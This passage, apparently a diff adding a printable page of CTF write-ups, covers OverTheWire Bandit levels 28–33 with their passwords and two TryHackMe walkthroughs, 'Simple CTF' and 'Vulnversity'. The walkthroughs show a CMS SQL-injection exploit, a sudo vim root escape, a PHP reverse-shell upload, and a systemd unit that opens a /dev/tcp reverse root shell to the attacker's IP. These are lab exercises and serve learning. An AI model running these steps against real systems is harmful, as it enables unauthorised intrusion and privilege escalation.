+#    Author: Morla Porla &lt;morla@overthewire.org&gt;
+#    Date:   Tue Oct 16 14:00:39 2018 +0200
+
+#        add missing data
+
+#    commit b67405defc6ef44210c53345fc953e6a21338cc7
+#    Author: Ben Dover &lt;noone@overthewire.org&gt;
+#    Date:   Tue Oct 16 14:00:39 2018 +0200
+
+#        initial commit of README.md
+
+git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
+cat README
+</code></pre>
+<p><strong><code>bbc96594b4e001778eee9975372716b2</code></strong></p>
+<h3 id="level-29"><a class="header" href="#level-29">Level 29</a></h3>
+<p>There is a git repository at <code>ssh://bandit29-git@localhost/home/bandit29-git/repo</code>. The password for the user bandit29-git is the same as for the user bandit29.</p>
+<p>Clone the repository and find the password for the next level.</p>
+<pre><code class="language-sh">ssh bandit29@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-29"><a class="header" href="#solution-29">Solution</a></h4>
+<p>We look into <code>README.md</code></p>
+<pre><code class="language-sh">cat README.md
+
+#    # Bandit Notes
+#    Some notes for bandit30 of bandit.
+
+#    ## credentials
+
+#    - username: bandit30
+#    - password: &lt;no passwords in production!&gt;
+
+# So we look at whether there are other branches
+
+git branch -r
+
+#    origin/HEAD -&gt; origin/master
+#    origin/dev
+#    origin/master
+#    origin/sploits-dev
+
+# We change branch and find the password in the README.md
+
+git checkout dev
+</code></pre>
+<p><strong><code>5b90576bedb2cc04c86a9e924ce42faf</code></strong></p>
+<h3 id="level-30"><a class="header" href="#level-30">Level 30</a></h3>
+<p>There is a git repository at <code>ssh://bandit30-git@localhost/home/bandit30-git/repo</code>. The password for the user bandit30-git is the same as for the user bandit30.</p>
+<p>Clone the repository and find the password for the next level.</p>
+<pre><code class="language-sh">ssh bandit30@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-30"><a class="header" href="#solution-30">Solution</a></h4>
+<pre><code class="language-sh">git tag
+
+# secret
+
+git show secret
+</code></pre>
+<p><strong><code>47e603bb428404d265f59c42920d81e5</code></strong></p>
+<h3 id="level-31"><a class="header" href="#level-31">Level 31</a></h3>
+<p>There is a git repository at <code>ssh://bandit31-git@localhost/home/bandit31-git/repo</code>. The password for the user bandit31-git is the same as for the user bandit31.</p>
+<p>Clone the repository and find the password for the next level.</p>
+<pre><code class="language-sh">ssh bandit31@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-31"><a class="header" href="#solution-31">Solution</a></h4>
+<pre><code class="language-sh">cd $(mktemp -d)
+git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
+cat README.md
+
+#    This time your task is to push a file to the remote repository.
+
+#    Details:
+#        File name: key.txt
+#        Content: 'May I come in?'
+#        Branch: master
+
+git add -f key.txt
+git commit -m &quot;bandit31&quot;
+git push
+</code></pre>
+<p><strong><code>56a9bf19c63d650ce78e6ec0354ee45e</code></strong></p>
+<h3 id="level-32"><a class="header" href="#level-32">Level 32</a></h3>
+<p>After all this git stuff its time for another escape. Good luck!</p>
+<pre><code class="language-sh">ssh bandit32@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-32"><a class="header" href="#solution-32">Solution</a></h4>
+<p>Once logged in, a shell in upper case opens</p>
+<p>Remember that
++ $0 =&gt; the name of the called script (with full path)
++ $# =&gt; number of arguments
++ $@ =&gt; list of arguments.</p>
+<pre><code class="language-sh">$0
+
+# The bash that ran the &quot;Shift&quot; script is recalled
+
+cat /etc/bandit_pass/bandit33
+</code></pre>
+<p><strong><code>c9c3199ddf4121b10cf581a98d51caee</code></strong></p>
+<h3 id="level-33"><a class="header" href="#level-33">Level 33</a></h3>
+<p>At this moment, level 34 does not exist yet.</p>
+<pre><code class="language-sh">ssh bandit33@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-33"><a class="header" href="#solution-33">Solution</a></h4>
+<pre><code class="language-sh">cat README.txt
+
+#    Congratulations on solving the last level of this game!
+
+#    At this moment, there are no more levels to play in this game. However, we are constantly working
+#    on new levels and will most likely expand this game with more levels soon.
+#    Keep an eye out for an announcement on our usual communication channels!
+#    In the meantime, you could play some of our other wargames.
+
+#    If you have an idea for an awesome new level, please let us know!
+</code></pre>
+<p>THE END</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="leviathan"><a class="header" href="#leviathan">Leviathan</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="natas"><a class="header" href="#natas">Natas</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="simple-ctf"><a class="header" href="#simple-ctf">Simple CTF</a></h1>
+<h2 id="recognition-1"><a class="header" href="#recognition-1">Recognition</a></h2>
+<pre><code class="language-bash">nmap -sV -A 10.10.52.109
+</code></pre>
+<p>From there, we discover several things.</p>
+<p><img src="ctf-write-up/try-hack-me/simple_ctf/./img/nmap.png" alt="'nmap'" /></p>
+<p>We can see that there is an SSH port open and an apache server running on port 80.</p>
+<p>So we can scan the server with <code>gobuster</code> or <code>nikto</code>.</p>
+<pre><code class="language-bash">gobuster dir -u http://10.10.52.109 -w /usr/share/wordlists/dirb/common.txt -t 10
+nikto -h 10.10.52.109
+</code></pre>
+<p>We end up discovering several pages/folders available</p>
+<p><img src="ctf-write-up/try-hack-me/simple_ctf/./img/url-fuzzing.png" alt="url-fuzzing.png" /></p>
+<p>The only one we are really interested in is <code>/simple</code> or at least it is the only one that allows us to attack. Indeed, the CMS Made Simple software is running at this location and by doing some research, we realize that an SQL Injection is possible (CVE-2019-9053).</p>
+<h2 id="exploit"><a class="header" href="#exploit">Exploit</a></h2>
+<p>You can find an exploit on the internet <a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a><br></p>
+<p>We run it and we find what we need as information to test the connection via ssh.</p>
+<pre><code class="language-python">python exploit.py -u http://10.10.52.109/simple --crack -w /usr/share/wordlists/dirb/common.txt
+</code></pre>
+<p><img src="ctf-write-up/try-hack-me/simple_ctf/./img/CMS-exploit.png" alt="CMS-exploit.png" /></p>
+<pre><code class="language-bash">ssh mitch@10.10.52.109 -p 2222
+</code></pre>
+<p>We can ask who we are with <code>whoami</code> (spoiler: mitch)
+and ask about the <code>uname -a</code> machine</p>
+<p>We especially want to know what mitch can do</p>
+<pre><code class="language-bash">sudo -l
+</code></pre>
+<p><img src="ctf-write-up/try-hack-me/simple_ctf/./img/rights.png" alt="rights" /></p>
+<p>So we run vim in sudo</p>
+<pre><code class="language-bash">sudo vim
+</code></pre>
+<p>once inside</p>
+<pre><code class="language-bash">:!bash
+</code></pre>
+<p>We are finally root on the machine!</p>
+<p>We can recover the requested information:</p>
+<pre><code class="language-bash">cat /root/root.txt
+cat /etc/passwd | grep home
+cat user.txt
+</code></pre>
+<p>THE END.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="vulnversity"><a class="header" href="#vulnversity">Vulnversity</a></h1>
+<h2 id="recognition-2"><a class="header" href="#recognition-2">Recognition</a></h2>
+<p>Start by scanning the machine with nmap</p>
+<pre><code class="language-bash">nmap -sV -A --script vuln 10.9.9.65
+</code></pre>
+<p>We see that the Apache server is running on port <code>3333</code></p>
+<p>So we scan this server</p>
+<pre><code class="language-bash">gobuster dir -u http://10.9.9.65:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+</code></pre>
+<p>We discover a subfolder <code>/internal/</code> that lets you upload files using a form.</p>
+<p>The only problem is that this form doesn't allow any type of file.</p>
+<p>We'll use BurpSuite to find the authorized file(s).</p>
+<p>Once BurpSuite has been set up correctly, we intercept the request and send a random file.</p>
+<p>Then we use <code>Sniper</code> and add a payload at the filename extension <code>filename=&quot;name.txt&quot;</code>.
+Just before the '.' and just after the end of the extension.</p>
+<p><img src="ctf-write-up/try-hack-me/vulnversity/./img/intruder.png" alt="intruder" /></p>
+<p>As suggested in the task 4 of the room, we create a wordlist with some extensions. We add these extensions as payloads in BurpSuite and then we can start the Attack.</p>
+<p><img src="ctf-write-up/try-hack-me/vulnversity/./img/intruder-payloads.png" alt="intruder-payloads" /></p>
+<p>Once the attack has been carried out, a window shows status 200 for each extension tested, as the request was successful. We therefore need to find out when the error message is not sent (the size of the response will be different).</p>
+<p>We find that the extension that works is <code>.phtml</code>.</p>
+<p>We'll use a reverse-shell already present in kali <code>/usr/share/webshells/php/php-reverse-shell.php</code> and rename it to <code>shell.phtml</code> (don't forget to change IP and port variables).</p>
+<p>This file can now be uploaded to the server. But before Submit, in a terminal, enter the following command:</p>
+<pre><code class="language-bash">nc -lvnp [PORT]
+</code></pre>
+<p>SUBMIT.</p>
+<p>There's a <code>bill</code> user, and in his /home, we can retrieve one of the expected flags.</p>
+<p>Next, we need to find a way to gain better privileges. We look for files with the SUID included for the root user.</p>
+<pre><code class="language-bash">find / -type f -user root -perm 6000 2&gt; /dev/null
+</code></pre>
+<p>We can see that <code>/bin/systemctl</code> is usable. Let's try to play with it. We can't use a text editor. So we're using the <code>echo</code> command to write in a file:</p>
+<pre><code class="language-bash">touch /tmp/root.service
+echo &quot;
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.9.9.65/4444 0&gt;&amp;1'
+[Install]
+WantedBy=multi-user.target
+&quot; &gt;&gt; /tmp/root.service
+</code></pre>
+<p>We now need to listen on our port 4444.</p>
+<pre><code class="language-bash">nc -lvnp 4444
+</code></pre>
+<p>Go back to the machine you're running and start the service.</p>
+<pre><code class="language-bash">/bin/systemctl enable /tmp/root/service
+/bin/systemctl start root
+</code></pre>
+<p>So we get a shell (with the root user) on the machine and have access to everything we want.</p>
+<pre><code class="language-bash">cat /root/root.txt
+</code></pre>
+<p>THE END.</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        <script type="text/javascript" src="mermaid.min.js"></script>
+        <script type="text/javascript" src="mermaid-init.js"></script>
+        <script type="text/javascript">
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+    </body>
+</html>
